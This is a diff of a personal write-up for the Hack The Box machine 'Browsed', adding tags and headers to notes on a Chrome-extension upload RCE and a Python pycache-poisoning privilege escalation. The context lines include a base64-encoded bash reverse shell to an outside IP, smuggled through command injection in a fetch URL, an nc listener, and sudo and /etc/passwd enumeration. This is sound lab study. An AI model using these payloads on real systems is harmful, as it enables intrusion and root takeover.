@@ -14,7 +14,10 @@ tags:
   - OWASP-OS-Command-Injection
   - Reverser-Shell-base64-javascript
   - CMS-unauthenticated-Gitea-enum
-lastmod: 2026-06-01T09:21:05.415Z
+  - Linux-Enumation-who-in-the-box
+  - Linux-Privilege-sudo-l
+  - Linux-Privilege-python-Library-Hijacking
+lastmod: 2026-06-02T03:12:01.937Z
 ---
 # Box Info
 
@@ -24,9 +27,7 @@ lastmod: 2026-06-01T09:21:05.415Z
 
 # Recon
 
-### \[\[PORT & IP SCAN]]
-
-summary the openport only with One-Paragraph -- AI
+### PORT & IP SCAN
 
 ```
 ┌─[✗]─[tester@parrot]─[~/Desktop/HTB]
@@ -98,7 +99,7 @@ http://10.129.244.79/ [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu L
 
 {{< toggle "Tag 🏷️" >}}
 
-{{< tag "OWASP-Fileupload-Linux-zip-chrome-extension" >}} The upload function require to upload the chorme extension as zip , if I normally upload the zip will return the the error message on php, so i will create the manifest.json and the javascript to do the rce
+{{< tag "OWASP-Fileupload-Linux-zip-chrome-extension" >}} The upload function require to upload the chorme extension as zip , if I normally upload the zip will return the the error message on php to find the extract domain , so I will create the manifest.json and the javascript to do the rce
 
 {{< /toggle >}}
 
@@ -512,20 +513,6 @@ Here's what the key sections mean:
 
 **Bottom line:** This looks like a log from an **automated testing or CI/CD environment** running Chrome headlessly (no real user, no D-Bus, limited filesystem access). The errors are expected in that kind of sandboxed setup and don't indicate anything seriously wrong.
 
-{{< toggle "Tag 🏷️" >}}
-
-{{< tag "logs-discover" >}} use the linux 's grep function to extract urls
-
-{{< /toggle >}}
-
-```
-[tester@parrot]─[~/Desktop/HTB/Browsed]
-└──╼ $cat logs.txt |  grep -oP 'https?://\S+'
-http://clients2.google.com/time/1/current?cup2key=8:lRwqXlw25rUTBPSHVmoug4mDW8F1szpAduz7cDrK8U0&cup2hreq=e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
-https://accounts.google.com/ListAccounts?gpsia=1&source=ChromiumBrowser&json=standard
-
-```
-
 For building this Chrome extension, we can refer to this guide. We primarily need two files -
 
 Create a zip file containing manifest.json and background.js .
@@ -571,6 +558,12 @@ document.querySelectorAll('img').forEach(img => {
   adding: content.js (deflated 29%)
 
 ```
+
+{{< toggle "Tag 🏷️" >}}
+
+{{< tag "logs-discover" >}} use the linux 's grep function to extract urls ,Put the web 's error message to the log file and discover the browsedinternals domain
+
+{{< /toggle >}}
 
 ```
 ┌─[tester@parrot]─[~/Desktop/HTB/Browsed]
@@ -801,6 +794,8 @@ fi
 
 The only place the user input is used is in the evaluation of which mode to run.
 
+### manifest.json -- 2
+
 I want to get access to `localhost:5000` on Browsed, so I’ll use the extension sandbox. I’ll create a `manifest.json`:
 
 ```
@@ -943,6 +938,8 @@ YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTYuMTAwLzQ0MyAgMD4mMSAgCg==
 fetch("http://localhost:5000/routines/" + encodeURIComponent("a[$(echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTYuMTAwLzQ0MyAgMD4mMSAgCg== | base64 -d | bash)]"));
 ```
 
+zip the background.js  and manifest.json again to package it to upload the website
+
 ```
 ┌─[tester@parrot]─[~/Desktop/HTB/Browsed]
 └──╼ $sudo  nc -lnvp 443 
@@ -987,7 +984,11 @@ larry
 
 ```
 
-cat /etc/passwd | grep 'bash\$'
+{{< toggle "Tag 🏷️" >}}
+
+{{< tag "Linux-Enumation-who-in-the-box" >}}  using the cat /etc/passwd | grep 'bash\$' to know who in the shell ?
+
+{{< /toggle >}}
 
 ```
 cat /etc/passwd | grep 'sh$' 
@@ -1011,6 +1012,39 @@ bash: cd: git: Permission denied
 
 ```
 
+{{< toggle "Tag 🏷️" >}}
+
+{{< tag "Linux-Privilege-sudo-l" >}} Using the sudo -l to know that the user can run /opt/extensiontool/extension\_tool.py with no password by root.
+
+{{< /toggle >}}
+
+```
+larry@browsed:/home$ sudo -l 
+sudo -l 
+Matching Defaults entries for larry on browsed:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+    use_pty
+
+User larry may run the following commands on browsed:
+    (root) NOPASSWD: /opt/extensiontool/extension_tool.py
+larry@browsed:/home$ 
+
+```
+
+{{< toggle "Tag 🏷️" >}}
+
+{{< tag "Linux-Privilege-python-Library-Hijacking" >}} The hint is that I can run the python as the root due to sudo -l ,so poising the python script as the python script uses the **pycache** of pyc to as the Cache files , so I can write the script and run to have the root
+
+{{< /toggle >}}
+
+```
+larry@browsed:/home$ ls -l /opt/extensiontool/extension_tool.py
+ls -l /opt/extensiontool/extension_tool.py
+-rwxrwxr-x 1 root root 2739 Mar 27  2025 /opt/extensiontool/extension_tool.py
+
+```
+
 Three things must be true for this attack to work:
 
 * **A privileged process** (e.g. running via `sudo`) imports a Python **module**
@@ -1027,27 +1061,6 @@ The attack steps
 Why the header reuse matters
 
 * Python checks the header for consistency. Using the real header makes the file appear legitimate so Python doesn't fall back to recompiling from the `.py` source.
-
-```
-larry@browsed:/home$ sudo -l 
-sudo -l 
-Matching Defaults entries for larry on browsed:
-    env_reset, mail_badpass,
-    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
-    use_pty
-
-User larry may run the following commands on browsed:
-    (root) NOPASSWD: /opt/extensiontool/extension_tool.py
-larry@browsed:/home$ 
-
-```
-
-```
-larry@browsed:/home$ ls -l /opt/extensiontool/extension_tool.py
-ls -l /opt/extensiontool/extension_tool.py
--rwxrwxr-x 1 root root 2739 Mar 27  2025 /opt/extensiontool/extension_tool.py
-
-```
 
 The `extensiontool` project directory has four objects:
 
@@ -1070,6 +1083,8 @@ drwxrwxrwx 2 root root 4096 Jun  1 07:40 .
 drwxr-xr-x 4 root root 4096 Dec 11 07:54 ..
 
 ```
+
+### **pycache**
 
 The most important thing to note about `__pycache__` is that it’s world writable. I’ll come back to that later.
 
@@ -1095,6 +1110,8 @@ extension_utils.cpython-312.pyc
 test
 
 ```
+
+### extension\_utils.py
 
 `extension_utils.py` holds two functions, `validate_manifest` and `clean_temp_files`. Exactly what they do isn’t super important.
 
@@ -1239,6 +1256,8 @@ I’m going to write a Python script to abuse this setup. My final exploit is:
 ┌─[tester@parrot]─[~/Desktop/HTB/Browsed]
 └──╼ $vim  poison.py 
 ```
+
+### poison.py
 
 ```
 ┌─[tester@parrot]─[~/Desktop/HTB/Browsed]
